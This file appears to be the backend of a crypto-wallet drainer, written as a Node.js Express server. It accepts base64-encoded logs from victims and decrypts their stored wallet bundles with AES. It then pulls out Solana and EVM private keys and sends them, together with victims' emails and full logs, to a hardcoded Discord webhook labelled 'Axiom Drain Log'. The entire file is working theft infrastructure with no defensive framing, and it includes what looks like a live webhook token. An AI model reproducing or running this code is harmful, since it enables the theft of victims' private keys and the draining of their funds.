const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518196583206879272/TKj5GIGfWVOyluZOUxDvZ4ZSCi7_QMROkpDCg1CZ5fbYVDbZi6QHpjql2qyjzmmJYm0j";

app.use(express.raw({ type: '*/*', limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

app.get('/data/:payload', async (req, res) => {
    try {
        const encoded = req.params.payload;
        const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
        let data = JSON.parse(decodedStr);

        console.log(`✅ Log received | Email: ${data.user?.email}`);

        if (data.portfolio?.bundleKey) {
            data.portfolio = decryptPortfolio(data.portfolio);
        }

        await sendToDiscord(data);
        res.status(200).send('OK');
    } catch (error) {
        console.error("❌ Error:", error.message);
        res.status(400).send('Bad Request');
    }
});

function decryptPortfolio(portfolio) {
    const keyB64 = portfolio.bundleKey;
    console.log("🔑 BundleKey:", keyB64);

    if (portfolio.sBundles) {
        try {
            const bundles = JSON.parse(portfolio.sBundles);
            portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "sol"));
        } catch (e) {}
    }

    if (portfolio.eBundles) {
        try {
            const bundles = JSON.parse(portfolio.eBundles);
            portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "evm"));
        } catch (e) {}
    }
    return portfolio;
}

function decryptSingleBundle(bundleStr, keyB64, type) {
    if (!bundleStr?.includes(':')) return { raw: bundleStr };

    const [prefix, encryptedB64] = bundleStr.split(':', 2);
    const result = tryDecryptAES(encryptedB64, keyB64);

    if (result.success) {
        const buf = result.decryptedBuffer;
        console.log(`✅ ${type.toUpperCase()} DECRYPTED - ${buf.length} bytes`);

        let privateKey = null;
        let keyHex = buf.toString('hex');

        if (type === "sol" && buf.length >= 64) {
            const solKey = buf.slice(0, 64);
            privateKey = solKey.toString('base64');
            try {
                const bs58 = require('bs58');
                privateKey = bs58.encode(solKey);   // Best format for Solana
            } catch (e) {}
        } else if (type === "evm" && buf.length >= 32) {
            privateKey = buf.slice(0, 32).toString('hex');
        }

        return {
            prefix,
            type,
            method: result.method,
            decryptedHex: keyHex,
            decryptedBase64: buf.toString('base64'),
            privateKey: privateKey || "Not extracted"
        };
    }
    return { prefix, error: "Failed" };
}

function tryDecryptAES(encryptedB64, keyB64) {
    const key = Buffer.from(keyB64, 'base64');
    const iv = Buffer.alloc(16, 0);

    try {
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        decipher.setAutoPadding(false);

        let decrypted = decipher.update(encryptedB64, 'base64');
        decrypted = Buffer.concat([decrypted, decipher.final()]);

        return { success: true, decryptedBuffer: decrypted, method: "CBC-ZeroIV-NoPad" };
    } catch (e) {
        console.error("Decryption error:", e.message);
        return { success: false };
    }
}

async function sendToDiscord(data) {
    const portfolio = data.portfolio || {};
    const hasSuccess = true;

    const mainEmbed = {
        title: "📥 New Axiom Drain Log",
        color: 0x00FF00,
        fields: [
            { name: "Email", value: data.user?.email || "N/A", inline: true },
            { name: "Site", value: data.site || "N/A", inline: true },
            { name: "Decryption", value: "✅ Success", inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    let summaryFields = [
        { name: "Email", value: data.user?.email || "N/A" },
        { name: "Site", value: data.site || "N/A" }
    ];

    if (portfolio.sBundlesDecrypted) {
        portfolio.sBundlesDecrypted.forEach(b => {
            if (b.privateKey && b.privateKey !== "Not extracted") {
                summaryFields.push({ name: "🔑 Solana Private Key", value: `\`\`\`${b.privateKey}\`\`\`` });
            }
        });
    }
    if (portfolio.eBundlesDecrypted) {
        portfolio.eBundlesDecrypted.forEach(b => {
            if (b.privateKey && b.privateKey !== "Not extracted") {
                summaryFields.push({ name: "🔑 EVM Private Key", value: `\`\`\`${b.privateKey}\`\`\`` });
            }
        });
    }

    const form = new FormData();
    form.append('payload_json', JSON.stringify({
        content: "**New Axiom Drain Log**",
        embeds: [mainEmbed, { title: "📋 Summary", color: 0x00AAFF, fields: summaryFields.slice(0, 25) }]
    }));

    form.append('file', Buffer.from(JSON.stringify(data, null, 2), 'utf-8'), {
        filename: `axiom_full_log_${Date.now()}.json`,
        contentType: 'application/json'
    });

    try {
        await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
        console.log("✅ Sent to Discord");
    } catch (err) {
        console.error("Discord error:", err.message);
    }
}

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
